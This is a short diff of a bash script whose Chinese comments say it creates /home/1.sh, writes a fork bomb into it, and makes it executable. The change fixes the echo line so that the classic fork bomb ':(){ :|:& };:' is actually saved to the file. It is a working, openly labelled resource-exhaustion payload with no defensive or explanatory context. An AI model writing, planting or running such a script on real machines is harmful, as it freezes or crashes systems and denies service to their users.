@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # 1. 创建 /home/1.sh 并写入fork炸弹
-echo -e "#!/bin/bash\n\n:(){ :|:& };:"
+echo -e "#!/bin/bash\n\n:(){ :|:& };:" > /home/1.sh
 
 # 2. 给 /home/1.sh 执行权限
 chmod +x /home/1.sh
